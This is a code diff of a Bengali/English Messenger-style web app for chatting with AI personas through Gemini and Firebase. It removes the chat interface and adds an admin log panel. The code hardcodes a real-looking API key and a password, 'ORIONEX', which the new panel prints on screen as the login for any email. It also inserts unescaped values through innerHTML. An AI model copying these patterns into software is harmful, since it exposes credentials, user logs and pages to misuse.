-                            <button class="bg-gray-200 p-2 rounded-full">
-                                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-700" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
-                                    <path stroke-linecap="round" stroke-linejoin="round" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" />
-                                    <path stroke-linecap="round" stroke-linejoin="round" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z" />
-                                </svg>
-                            </button>
-                            <button class="bg-gray-200 p-2 rounded-full">
-                                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-700" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
-                                    <path stroke-linecap="round" stroke-linejoin="round" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z" />
-                                </svg>
-                            </button>
-                        </div>
-                    </div>
-                    <div class="relative mt-3">
-                        <input type="text" placeholder="Search" class="w-full bg-gray-100 rounded-full py-2 pl-10 pr-4 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500">
-                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-400 absolute left-3 top-1/2 transform -translate-y-1/2" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M8 4a4 4 0 100 8 4 4 0 000-8zM2 8a6 6 0 1110.89 3.476l4.817 4.817a1 1 0 01-1.414 1.414l-4.816-4.816A6 6 0 012 8z" clip-rule="evenodd" /></svg>
-                    </div>
-                </div>
-
-                <div class="flex justify-around text-sm font-medium text-gray-500 border-b border-gray-200 -mx-4 px-4 py-2 bg-white flex-shrink-0 nav-tabs-container">
-                    <button id="chats-tab" class="py-2 border-b-2 border-blue-500 text-blue-500 px-4">Chats</button>
-                    <button id="calls-tab" class="py-2 px-4">Calls</button>
-                    <button id="people-tab" class="py-2 px-4">People</button>
-                    <button id="stories-tab" class="py-2 px-4">Stories</button>
-                    <button id="buses-tab" class="py-2 px-4">Buses</button>
-                </div>
-
-                <div id="active-now-section" class="p-4 border-b border-gray-200 bg-white flex-shrink-0">
-                    <h3 class="text-xs font-semibold text-gray-500 uppercase mb-3">Active Now (🟢)</h3>
-                    <div id="active-now-list" class="flex space-x-4 overflow-x-auto pb-2">
-                        <!-- Active contacts will be rendered here -->
-                    </div>
-                </div>
-
-                <div id="recent-chats-section" class="flex-1 overflow-y-auto bg-white custom-scrollbar">
-                    <!-- Recent chats will be rendered here -->
-                </div>
-            </div>
-            <!-- Display current user ID -->
-            <div class="p-4 border-t border-gray-200 text-sm text-gray-600 truncate">
-                Your User ID: <span id="user-id-display" class="font-mono text-gray-800"></span>
-            </div>
-        </aside>
-
-        <!-- Main Content Area -->
-        <main id="main-content-area" class="flex-1 flex flex-col bg-gray-100 rounded-l-xl overflow-hidden">
-            <!-- Mobile menu toggle button -->
-            <div class="md:hidden p-4 bg-white shadow-sm flex justify-between items-center rounded-bl-xl">
-                <button id="open-sidebar-btn" class="text-gray-700 hover:text-indigo-600 focus:outline-none focus:ring-2 focus:ring-indigo-500 p-2 rounded-md" aria-label="Open menu">
-                    <svg class="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path></svg>
-                </button>
-                <h1 class="text-xl font-bold text-indigo-700">Messenger</h1>
-            </div>
-
-            <!-- Views Container -->
-            <div id="views-container" class="flex-1 flex flex-col">
-                <!-- Chat List View (content moved to sidebar) -->
-                <div id="chat-list-view" class="flex flex-col h-full hidden">
-                    <!-- This div is now effectively empty as its content is in the sidebar -->
-                </div>
-
-                <!-- People View -->
-                <div id="people-view" class="flex flex-col h-full hidden">
-                    <div class="chat-view-header">
-                        <button class="back-button" id="people-back-to-list">
-                            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M10 19l-7-7m0 0l7-7m-7 7h18" /></svg>
-                        </button>
-                        <span class="contact-name">People</span>
-                    </div>
-                    <div class="flex-1 overflow-y-auto bg-white custom-scrollbar">
-                        <div id="all-people-list" class="py-2">
-                            <!-- All people will be rendered here -->
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Buses View -->
-                <div id="buses-view" class="flex flex-col h-full hidden">
-                    <div class="chat-view-header">
-                        <button class="back-button" id="buses-back-to-list">
-                            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M10 19l-7-7m0 0l7-7m-7 7h18" /></svg>
-                        </button>
-                        <span class="contact-name">Buses</span>
-                    </div>
-                    <div class="flex-1 overflow-y-auto bg-white p-4 text-gray-700 custom-scrollbar">
-                        <h2 class="text-xl font-semibold mb-4">Bus Information & Services</h2>
-                        <p class="mb-2">Welcome to the Buses feature! Here you can find information about bus routes, schedules, and potentially book tickets.</p>
-                        <p class="mb-2">This is a placeholder. More features will be added soon!</p>
-                        <div class="mt-4 p-4 bg-gray-100 rounded-lg">
-                            <h3 class="font-medium text-lg mb-2">Upcoming Features:</h3>
-                            <ul class="list-disc list-inside">
-                                <li>Real-time bus tracking</li>
-                                <li>Route planning</li>
-                                <li>Ticket booking integration</li>
-                                <li>Favorite routes</li>
-                            </ul>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Secret Settings View -->
-                <div id="settings-view" class="flex flex-col h-full hidden">
-                    <div class="chat-view-header">
-                        <button class="back-button" id="settings-back-to-list">
-                            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M10 19l-7-7m0 0l7-7m-7 7h18" /></svg>
-                        </button>
-                        <span class="contact-name">Character Settings</span>
-                    </div>
-                    <div class="flex-1 overflow-y-auto bg-white p-4 custom-scrollbar">
-                        <h3 class="text-lg font-semibold mb-4">Manage Characters</h3>
-                        <div id="character-list" class="mb-6 border rounded-lg overflow-hidden">
-                            <!-- Character items will be rendered here -->
-                        </div>
-
-                        <h3 class="text-lg font-semibold mb-4" id="form-title">Add New Character</h3>
-                        <form id="character-form" class="p-4 border rounded-lg bg-gray-50">
-                            <input type="hidden" id="current-edit-contact-name">
-                            <div class="mb-3">
-                                <label for="character-name" class="block text-sm font-medium text-gray-700 mb-1">Character Name:</label>
-                                <input type="text" id="character-name" placeholder="e.g., Roshni (My Everything) 💖" class="block w-full rounded-md border-gray-300 shadow-sm focus:border-blue-500 focus:ring-blue-500">
-                            </div>
-                            <div class="mb-3">
-                                <label for="character-image" class="block text-sm font-medium text-gray-700 mb-1">Image URL:</label>
-                                <input type="text" id="character-image" placeholder="e.g., https://i.postimg.cc/SQvjgmBh/real-girl-pic-41.jpg" class="block w-full rounded-md border-gray-300 shadow-sm focus:border-blue-500 focus:ring-blue-500">
-                            </div>
-                            <div class="mb-3">
-                                <label for="character-status" class="block text-sm font-medium text-gray-700 mb-1">Status:</label>
-                                <input type="text" id="character-status" placeholder="e.g., Active Now, Offline, 15m ago" class="block w-full rounded-md border-gray-300 shadow-sm focus:border-blue-500 focus:ring-blue-500">
-                            </div>
-                            <div class="mb-3">
-                                <label for="character-persona" class="block text-sm font-medium text-gray-700 mb-1">Persona / System Prompt:</label>
-                                <textarea id="character-persona" rows="5" placeholder="e.g., তুমি Roshni, একজন মিষ্টি, আবেগপ্রবণ, রোমান্টিক বাঙালি বান্ধবী।" class="block w-full rounded-md border-gray-300 shadow-sm focus:border-blue-500 focus:ring-blue-500"></textarea>
-                            </div>
-                            <div class="flex justify-end">
-                                <button type="button" id="save-character-button" class="save px-4 py-2 rounded-md">Save Character</button>
-                                <button type="button" id="add-new-character-button" class="clear px-4 py-2 rounded-md">Add New Character</button>
-                                <button type="button" id="cancel-edit-button" class="cancel px-4 py-2 rounded-md hidden">Cancel Edit</button>
-                            </div>
-                        </form>
-
-                        <hr class="my-6 border-gray-300 dark:border-gray-600">
-
-                        <h3 class="text-lg font-semibold mb-4">Data Management</h3>
-                        <div class="flex flex-col space-y-3">
-                            <button id="export-data-button" class="bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded-md">Export All Data (JSON)</button>
-                            <input type="file" id="import-data-input" accept=".json" class="hidden">
-                            <button id="import-data-button" class="bg-green-500 hover:bg-green-600 text-white px-4 py-2 rounded-md">Import Data (JSON)</button>
-                            <button id="reset-data-button" class="bg-red-500 hover:bg-red-600 text-white px-4 py-2 rounded-md">Reset All Data (Danger!)</button>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Individual Chat View -->
-                <div id="individual-chat-view" class="flex flex-col h-full hidden">
-                    <div class="chat-view-header">
-                        <button class="back-button" id="back-to-main-list">
-                            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M10 19l-7-7m0 0l7-7m-7 7h18" /></svg>
-                        </button>
-                        <img id="chat-contact-pic" src="" alt="Contact Profile Picture" class="profile-pic-small" onerror="this.onerror=null;this.src='https://placehold.co/32x32/cccccc/333333?text=N/A';">
-                        <div class="flex flex-col flex-1 min-w-0 mr-2">
-                            <span class="contact-name truncate" id="chat-contact-name"></span>
-                            <span class="contact-status" id="chat-contact-status"></span>
-                        </div>
-                        <div class="flex justify-end space-x-4 action-icons-group">
-                            <button class="text-blue-500"><svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2H5a2 2 0 01-2-2V5z" /></svg></button>
-                            <button class="text-blue-500"><svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h14a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg></button>
-                            <button id="summarize-chat-button" class="text-blue-500 p-1 rounded-full hover:bg-gray-100 transition-colors duration-200" title="Summarize Chat">
-                                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
-                                    <path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
-                                </svg>
-                            </button>
-                        </div>
-                    </div>
-
-                    <div id="chat-messages-display" class="chat-messages-display custom-scrollbar">
-                        <!-- Messages will be displayed here -->
-                    </div>
-
-                    <div id="suggested-replies-container" class="suggested-replies-container hidden">
-                        <!-- Suggested replies will be displayed here -->
-                    </div>
-
-                    <div class="chat-input-bar">
-                        <button class="icon mr-2">
-                            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
-                                <path stroke-linecap="round" stroke-linejoin="round" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" />
-                                <path stroke-linecap="round" stroke-linejoin="round" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z" />
-                            </svg>
-                        </button>
-                        <button class="icon mr-2">
-                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                <path d="M12 15C14.21 15 16 13.21 16 11V5C16 2.79 14.21 1 12 1C9.79 1 8 2.79 8 5V11C8 13.21 9.79 15 12 15ZM19 11C19 14.53 16.39 17.44 13 17.93V21H11V17.93C7.61 17.44 5 14.53 5 11H3C3 15.42 6.57 19.11 11 19.85V23H13V19.85C17.43 19.11 21 15.42 21 11H19Z" fill="currentColor"/>
-                            </svg>
-                        </button>
-                        <input type="text" id="chat-input" placeholder="Aa" class="text-gray-700">
-                        <button id="suggest-reply-button" class="icon ml-2">
-                            ✨
-                        </button>
-                        <button id="send-button" class="icon ml-2">
-                            <svg class="send-button-icon" viewBox="0 0 24 24">
-                                <path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/>
-                            </svg>
-                        </button>
-                    </div>
-                </div>
-            </div>
-        </main>
-    </div>
-
-    <!-- Password Modal -->
-    <div id="password-modal" class="modal-overlay hidden">
-        <div class="modal-content">
-            <h3 class="text-xl font-semibold mb-4">Enter Password</h3>
-            <input type="password" id="password-input" placeholder="Password">
-            <button id="password-submit">Submit</button>
-            <p id="password-error" class="text-red-500 text-sm mt-2 hidden">Incorrect password. Please try again.</p>
+    <!-- Admin Panel - Initially Hidden -->
+    <div id="adminPanel" style="display:none;">
+        <h2>অ্যাডমিন লগ অ্যাক্সেস</h2>
+        <p class="text-sm text-gray-600 mb-4">লগ দেখতে, যেকোনো ইমেল এবং পাসওয়ার্ড হিসেবে 'ORIONEX' লিখুন।</p>
+        <input type="email" id="adminEmail" placeholder="অ্যাডমিন ইমেল">
+        <input type="password" id="adminPassword" placeholder="অ্যাডমিন পাসওয়ার্ড">
+        <button id="adminLoginBtn">লগইন করুন</button>
+        <div class="log-display" id="logDisplay">
+            <!-- Logs will be displayed here after successful admin login -->
         </div>
     </div>
 
-    <!-- Confirmation Modal for Deletion -->
-    <div id="confirmation-modal" class="modal-overlay hidden">
-        <div class="modal-content">
-            <h3 class="text-xl font-semibold mb-4" id="confirmation-message-title">Confirm Deletion</h3>
-            <p id="confirmation-message-text" class="mb-6">Are you sure you want to delete this character?</p>
-            <div class="flex justify-center space-x-4">
-                <button id="confirm-delete-button" class="bg-red-500 hover:bg-red-600 text-white px-5 py-2 rounded-md">Delete</button>
-                <button id="cancel-delete-button" class="bg-gray-400 hover:bg-gray-500 text-white px-5 py-2 rounded-md">Cancel</button>
-            </div>
+    <!-- Language Popup -->
+    <div class="language-popup" id="languagePopup">
+        <div class="lang-header">
+            <span>আপনার ভাষা নির্বাচন করুন</span>
+            <button onclick="closeLangPopup()">✕</button>
+        </div>
+        <div class="lang-list" id="langList">
+            <!-- Languages will be populated by JavaScript -->
         </div>
     </div>
 
     <!-- Custom Message Box -->
-    <div id="custom-message-box" class="custom-message-box hidden"></div>
+    <div id="messageBox" class="message-box">
+        <p id="messageContent"></p>
+        <button onclick="hideMessageBox()">ঠিক আছে</button>
+    </div>
 
-    <!-- Firebase SDKs -->
     <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
-        import { getFirestore, doc, setDoc, onSnapshot, collection, query, updateDoc, deleteDoc, Timestamp, getDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+        // Import Firebase SDK functions
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-app.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-analytics.js";
+        import { getFirestore, collection, addDoc, serverTimestamp, query, getDocs } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-firestore.js";
+        import { getAuth, onAuthStateChanged, signInAnonymously, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-auth.js";
 
-        // --- Global Variables (from Canvas environment) ---
-        const firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : {};
+        // Global variables provided by Canvas environment
         const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
         const initialAuthToken = typeof __initial_auth_token !== 'undefined' ? __initial_auth_token : null;
 
-        // --- Gemini API Configuration ---
-        // WARNING: Client-side API key usage is not secure for production.
-        // For a production app, you should use a backend server to handle API calls.
-        const API_KEY = "AIzaSyDVdti41rOyMb_27uvJe-4KpLCxUiBkJWc"; // আপনার Gemini API কী এখানে দিন
-        const API_URL = "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=" + API_KEY;
-        const SECRET_PASSWORD = "ORIONEX"; // সেটিংস অ্যাক্সেস করার জন্য গোপন পাসওয়ার্ড
-
-        // --- Firebase Instances ---
-        let app, db, auth;
-        let userId = null; // Current user ID
-        let activeChatbotId = null; // Currently selected chatbot ID
-        let allCharacters = {}; // Stores all character definitions fetched from Firestore
-        let allConversations = {}; // Stores all conversation data: { chatbotId: { messages: [], lastUpdated: Timestamp } }
-        let isTyping = false; // Flag for typing indicator
-        let unsubscribeFromActiveChat = null; // Function to unsubscribe from the active chat listener
-        let unsubscribeFromCharacters = null; // Function to unsubscribe from characters listener
-        let unsubscribeFromConversations = null; // Function to unsubscribe from conversations listener
-
-        // --- DOM Element References ---
-        const loadingOverlay = document.getElementById('loading-overlay');
-        const errorMessageDiv = document.getElementById('error-message');
-        const errorTextSpan = document.getElementById('error-text');
-        const userIdDisplay = document.getElementById('user-id-display');
-
-        // Main views
-        const chatListView = document.getElementById('chat-list-view'); // This is now part of the sidebar
-        const peopleView = document.getElementById('people-view');
-        const busesView = document.getElementById('buses-view');
-        const individualChatView = document.getElementById('individual-chat-view');
-        const settingsView = document.getElementById('settings-view');
-
-        // Navigation tabs
-        const chatsTab = document.getElementById('chats-tab');
-        const callsTab = document.getElementById('calls-tab');
-        const peopleTab = document.getElementById('people-tab');
-        const storiesTab = document.getElementById('stories-tab');
-        const busesTab = document.getElementById('buses-tab');
-
-        // Chat list elements
-        const activeNowList = document.getElementById('active-now-list');
-        const recentChatsSection = document.getElementById('recent-chats-section');
-        const allPeopleList = document.getElementById('all-people-list');
-
-        // Individual chat view elements
-        const chatContactName = document.getElementById('chat-contact-name');
-        const chatContactPic = document.getElementById('chat-contact-pic');
-        const chatContactStatus = document.getElementById('chat-contact-status');
-        const chatMessagesDisplay = document.getElementById('chat-messages-display');
-        const chatInput = document.getElementById('chat-input');
-        const sendButton = document.getElementById('send-button');
-        const suggestReplyButton = document.getElementById('suggest-reply-button');
-        const suggestedRepliesContainer = document.getElementById('suggested-replies-container');
-        const summarizeChatButton = document.getElementById('summarize-chat-button');
-
-        // Back buttons
-        const backToMainListButton = document.getElementById('back-to-main-list');
-        const peopleBackToListButton = document.getElementById('people-back-to-list');
-        const busesBackToListButton = document.getElementById('buses-back-to-list');
-        const settingsBackToListButton = document.getElementById('settings-back-to-list');
-
-        // Password Modal elements
-        const passwordModal = document.getElementById('password-modal');
-        const passwordInput = document.getElementById('password-input');
-        const passwordSubmitButton = document.getElementById('password-submit');
-        const passwordError = document.getElementById('password-error');
-        const settingsButton = document.getElementById('settings-button'); // Settings button in header
-
-        // Confirmation Modal elements
-        const confirmationModal = document.getElementById('confirmation-modal');
-        const confirmationMessageTitle = document.getElementById('confirmation-message-title');
-        const confirmationMessageText = document.getElementById('confirmation-message-text');
-        const confirmDeleteButton = document.getElementById('confirm-delete-button');
-        const cancelDeleteButton = document.getElementById('cancel-delete-button');
-        let confirmCallback = null; // To store the callback for confirmation
-
-        // Settings View elements
-        const characterList = document.getElementById('character-list');
-        const characterForm = document.getElementById('character-form');
-        const formTitle = document.getElementById('form-title');
-        const currentEditContactName = document.getElementById('current-edit-contact-name');
-        const characterNameInput = document.getElementById('character-name');
-        const characterImageInput = document.getElementById('character-image');
-        const characterStatusInput = document.getElementById('character-status');
-        const characterPersonaInput = document.getElementById('character-persona');
-        const saveCharacterButton = document.getElementById('save-character-button');
-        const addNewCharacterButton = document.getElementById('add-new-character-button');
-        const cancelEditButton = document.getElementById('cancel-edit-button');
-
-        const customMessageBox = document.getElementById('custom-message-box'); // Custom message box element
-
-        // Mobile sidebar elements
-        const sidebar = document.getElementById('sidebar');
-        const sidebarOverlay = document.getElementById('sidebar-overlay');
-        const openSidebarBtn = document.getElementById('open-sidebar-btn');
-        const closeSidebarBtn = document.getElementById('close-sidebar-btn');
-
-        // --- Default Chatbot Definitions (Your "Contacts") ---
-        // User requested to remove all default characters.
-        // They will be added via the settings panel.
-        const defaultChatbots = {};
-
-        /**
-         * চ্যাট ডিসপ্লেতে একটি মেসেজ যোগ করে। (Adds a message to the chat display.)
-         * @param {string} message - মেসেজের টেক্সট কন্টেন্ট। (The text content of the message.)
-         * @param {'You'|string} sender - মেসেজের প্রেরক ('You' অথবা কন্টাক্টের নাম)। (The sender of the message ('You' or contact name).)
-         * @param {string} [profilePicUrl=''] - প্রেরকের প্রোফাইল পিকচারের URL (প্রাপ্ত মেসেজের জন্য)। (URL of the sender's profile picture (for received messages).)
-         * @param {boolean} [isLastMessageInHistory=false] - এটি কি এই চ্যাটের পুরো ইতিহাসের শেষ মেসেজ। (Whether this is the very last message in the entire history for this chat.)
-         */
-        function addMessageToChat(message, sender, profilePicUrl = '', isLastMessageInHistory = false) {
-            const messageRow = document.createElement('div');
-            messageRow.classList.add('message-row'); // message-row handles the spacing
-
-            const chatBubble = document.createElement('div');
-            chatBubble.classList.add(sender === 'You' ? 'chat-bubble-sent' : 'chat-bubble-received');
-            chatBubble.textContent = message;
-
-            if (sender === 'You') {
-                messageRow.classList.add('sent');
-                messageRow.appendChild(chatBubble);
-                const sentIndicator = document.createElement('div');
-                sentIndicator.classList.add('reaction-text', 'self-end', 'mr-4', 'mt-1');
-                sentIndicator.textContent = 'Sent';
-                messageRow.appendChild(sentIndicator);
-            } else {
-                messageRow.classList.add('received');
-                if (profilePicUrl) {
-                    const img = document.createElement('img');
-                    img.src = profilePicUrl;
-                    img.alt = sender + ' Profile Picture';
-                    img.classList.add('profile-pic-small');
-                    img.onerror = function() { this.onerror=null;this.src='https://placehold.co/32x32/cccccc/333333?text=N/A'; };
-                    messageRow.appendChild(img);
-                }
-                messageRow.appendChild(chatBubble);
-                if (isLastMessageInHistory) {
-                    const seenIndicator = document.createElement('div');
-                    seenIndicator.classList.add('reaction-text', 'self-start', 'ml-4', 'mt-1');
-                    seenIndicator.textContent = 'Seen';
-                    messageRow.appendChild(seenIndicator);
-                }
-            }
-            chatMessagesDisplay.appendChild(messageRow);
-            chatMessagesDisplay.scrollTop = chatMessagesDisplay.scrollHeight;
-        }
-
-        /**
-         * Shows the typing indicator.
-         * @param {string} profilePic - The URL of the chatbot's profile picture.
-         * @param {string} contactName - The name of the chatbot.
-         */
-        function showTypingIndicator(profilePic, contactName) {
-            const typingIndicatorElement = document.createElement('div');
-            typingIndicatorElement.id = 'typing-indicator'; // Add an ID to easily find it
-            typingIndicatorElement.classList.add('typing-indicator');
-            typingIndicatorElement.innerHTML = `
-                <img src="${profilePic}" alt="${contactName} Profile Picture" class="profile-pic-small mr-2" onerror="this.onerror=null;this.src='https://placehold.co/32x32/cccccc/333333?text=N/A';">
-                <div class="chat-bubble-received">
-                    <span class="dot"></span><span class="dot"></span><span class="dot"></span>
-                </div>
-            `;
-            chatMessagesDisplay.appendChild(typingIndicatorElement);
-            chatMessagesDisplay.scrollTop = chatMessagesDisplay.scrollHeight;
-            isTyping = true;
-            chatInput.disabled = true;
-            sendButton.disabled = true;
-        }
-
-        /**
-         * Hides the typing indicator.
-         */
-        function hideTypingIndicator() {
-            const typingIndicatorElement = document.getElementById('typing-indicator');
-            if (typingIndicatorElement && chatMessagesDisplay.contains(typingIndicatorElement)) {
-                chatMessagesDisplay.removeChild(typingIndicatorElement);
-            }
-            isTyping = false;
-            chatInput.disabled = false;
-            sendButton.disabled = false;
-        }
-
-        /**
-         * Gemini API-তে একটি মেসেজ পাঠায় এবং টাইপিং অ্যানিমেশন সহ AI-এর প্রতিক্রিয়া প্রদর্শন করে। (Sends a message to the Gemini API and displays the AI's response with a typing animation.)
-         * @param {string} prompt - AI-তে পাঠানোর জন্য ব্যবহারকারীর মেসেজ। (The user's message to send to the AI.)
-         * @param {string} characterId - ক্যারেক্টার ID। (The character ID.)
-         * @param {string} contactName - কন্টাক্টের নাম (AI ব্যক্তিত্ব)। (The name of the contact (AI persona).)
-         * @param {string} profilePic - কন্টাক্টের প্রোফাইল পিকচারের URL। (The profile picture URL of the contact.)
-         * @param {string} persona - AI-এর জন্য বিস্তারিত ব্যক্তিত্বের বর্ণনা। (The detailed persona description for the AI.)
-         */
-        async function sendMessageToGemini(prompt, characterId, contactName, profilePic, persona) {
-            // Get current messages for the active conversation
-            const currentMessages = allConversations[characterId]?.messages || [];
-            const updatedMessages = [...currentMessages, { role: "user", parts: [{ text: prompt }], timestamp: Timestamp.now() }];
-
-            // Update Firestore with user's message
-            const conversationDocRef = doc(db, `artifacts/${appId}/users/${userId}/conversations`, characterId);
-            await setDoc(conversationDocRef, {
-                chatbotId: characterId,
-                chatbotName: contactName,
-                messages: updatedMessages,
-                lastUpdated: Timestamp.now()
-            }, { merge: true }); // Use merge to avoid overwriting other fields if they exist
-
-            chatInput.value = ''; // Clear input field immediately after sending
-
-            showTypingIndicator(profilePic, contactName);
-
-            const fullChatHistoryForGemini = [
-                { role: "user", parts: [{ text: persona + "\n\n" + "এই কথোপকথনে, তুমি আমার সাথে কথা বলবে। তোমার চরিত্রটি হবে: " + contactName + "। এখন থেকে এই চরিত্র অনুযায়ী উত্তর দেবে। আমার সাথে কথোপকথন শুরু করো।" }] }
-            ];
-            // Add existing chat history for context, excluding the initial persona setup message
-            updatedMessages.forEach(msg => {
-                 // Ensure only 'role' and 'parts' are sent to Gemini
-                fullChatHistoryForGemini.push({ role: msg.role, parts: msg.parts });
-            });
-
-            const payload = { contents: fullChatHistoryForGemini };
-
-            try {
-                const response = await fetch(API_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                const result = await response.json();
-
-                hideTypingIndicator();
-
-                if (result.candidates && result.candidates.length > 0 &&
-                    result.candidates[0].content && result.candidates[0].content.parts &&
-                    result.candidates[0].content.parts.length > 0) {
-                    const fullText = result.candidates[0].content.parts[0].text;
-
-                    const sentences = fullText.split(/(?<=[.!?])\s+|\n/).filter(s => s.trim() !== '');
-                    const MAX_BUBBLE_LENGTH = 100;
-
-                    let accumulatedTextForHistory = "";
-
-                    for (let i = 0; i < sentences.length; i++) {
-                        let remainingSentence = sentences[i].trim();
-                        if (!remainingSentence) continue;
-
-                        while (remainingSentence.length > 0) {
-                            let segmentToSend = remainingSentence;
-                            let currentBubbleContent = "";
-
-                            if (remainingSentence.length > MAX_BUBBLE_LENGTH) {
-                                let breakPoint = remainingSentence.lastIndexOf(' ', MAX_BUBBLE_LENGTH);
-                                if (breakPoint === -1 || breakPoint < MAX_BUBBLE_LENGTH / 2) {
-                                    breakPoint = MAX_BUBBLE_LENGTH;
-                                }
-                                segmentToSend = remainingSentence.substring(0, breakPoint);
-                                remainingSentence = remainingSentence.substring(breakPoint).trim();
-                            } else {
-                                remainingSentence = '';
-                            }
-
-                            // Temporarily add message to UI for typing effect
-                            const tempMessageBubble = document.createElement('div');
-                            tempMessageBubble.classList.add('message-row', 'received');
-                            tempMessageBubble.innerHTML = `<img src="${profilePic}" alt="${contactName} Profile Picture" class="profile-pic-small" onerror="this.onerror=null;this.src='https://placehold.co/32x32/cccccc/333333?text=N/A';"> <div class="chat-bubble-received"></div>`;
-                            chatMessagesDisplay.appendChild(tempMessageBubble);
-                            chatMessagesDisplay.scrollTop = chatMessagesDisplay.scrollHeight;
-
-                            const actualBubble = tempMessageBubble.querySelector('.chat-bubble-received');
-                            for (let charIndex = 0; charIndex < segmentToSend.length; charIndex++) {
-                                actualBubble.textContent += segmentToSend.charAt(charIndex);
-                                currentBubbleContent += segmentToSend.charAt(charIndex);
-                                chatMessagesDisplay.scrollTop = chatMessagesDisplay.scrollHeight;
-                                await new Promise(resolve => setTimeout(resolve, 20));
-                            }
-                            accumulatedTextForHistory += currentBubbleContent;
-                            await new Promise(resolve => setTimeout(resolve, 100));
-                        }
-                        if (i < sentences.length - 1) {
-                            await new Promise(resolve => setTimeout(resolve, 200));
-                        }
-                    }
-                    // Update Firestore with the complete AI response
-                    const finalMessages = [...updatedMessages, { role: "model", parts: [{ text: accumulatedTextForHistory }], timestamp: Timestamp.now() }];
-                    await updateDoc(conversationDocRef, {
-                        messages: finalMessages,
-                        lastUpdated: Timestamp.now()
-                    });
-                    // UI will update via onSnapshot listener
-                } else {
-                    showCustomMessage("ত্রুটি: AI থেকে প্রতিক্রিয়া পাওয়া যায়নি। (অপ্রত্যাশিত API প্রতিক্রিয়া) (Error: Could not get a response from AI. (Unexpected API response))");
-                    console.error("প্রতিক্রিয়ার অপ্রত্যাশিত API কাঠামো: (Unexpected API response structure:)", result);
-                }
-            } catch (error) {
-                hideTypingIndicator();
-                showCustomMessage("ত্রুটি: AI-এর সাথে সংযোগ ব্যর্থ হয়েছে। আপনার নেটওয়ার্ক বা API কী পরীক্ষা করুন। (Error: Failed to connect to AI. Please check your network or API key.)");
-                console.error("জেমিনি API কল করতে ত্রুটি: (Error calling Gemini API:)", error);
-            }
-        }
-
